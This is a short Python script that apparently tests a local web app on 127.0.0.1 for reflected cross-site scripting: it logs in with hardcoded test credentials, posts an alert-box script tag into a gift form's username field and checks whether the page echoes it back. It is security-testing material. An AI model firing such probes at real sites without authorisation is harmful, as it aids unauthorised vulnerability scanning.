import requests

loginurl=('127.0.0.1/login.html')
secureurl=('127.0.0.1/index.html')

# Fill in your details here to be posted to the login form.
payload = {
    'uname': 'john',
    'pword': 'johnpass'
}
payload2 = {
    'amount': '0',
    'username': '<script>alert("hello")</script>;'
}

def getcookies(s): 
	for c in s.cookies:
		if c.name == "sessionid":
			return c

# Use 'with' to ensure the session context is closed after use.
with requests.Session() as s:
    s.post('http://127.0.0.1/login.html', data = payload)
    sessioncookie=getcookies(s)
    sessioncookie.secure = False
    # An authorised request.
    s.get('http://127.0.0.1/gift/0')
    x=s.post('http://127.0.0.1/gift/0', data = payload2)
    fullstring = x.text
    substring = '<script>alert("hello")</script>;'
    if fullstring.find(substring) != -1:
    	print('XSS vulnerable')
    else:
    	print('Not vulnerable')
    
    
    

